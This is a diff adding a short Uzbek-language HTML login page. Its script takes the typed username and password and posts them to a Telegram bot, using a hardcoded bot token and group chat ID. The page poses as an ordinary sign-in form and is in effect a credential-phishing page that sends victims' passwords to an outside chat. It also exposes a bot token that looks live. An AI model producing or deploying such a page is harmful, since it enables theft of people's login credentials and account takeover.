@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Kirish</title>
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 400px; margin: auto; }
+        input, button {
+            width: 100%; padding: 10px; margin: 10px 0; font-size: 18px;
+        }
+        button { background: #4CAF50; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<h2>Kirish</h2>
+
+<input id="login" type="text" placeholder="Login">
+<input id="parol" type="password" placeholder="Parol">
+
+<button onclick="yubor()">Kirish</button>
+
+<script>
+function yubor() {
+    let login = document.getElementById("login").value;
+    let parol = document.getElementById("parol").value;
+
+    // Sizning Telegram bot tokeningiz
+    let token = "8178024722:AAH_rnSgecfUvUCG82KKem3W2862LjOge8M";  
+
+    // Guruh chat ID
+    let chat_id = "-1003398046352";  
+
+    let matn = `🔐 yangi foydalanuvchi:\nLogin: ${login}\nParol: ${parol}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: matn
+        })
+    })
+    .then(res => alert("Kiritilgan ma'lumot yuborildi!"))
+    .catch(err => alert("Xatolik: " + err));
+}
+</script>
+
+</body>
+</html>
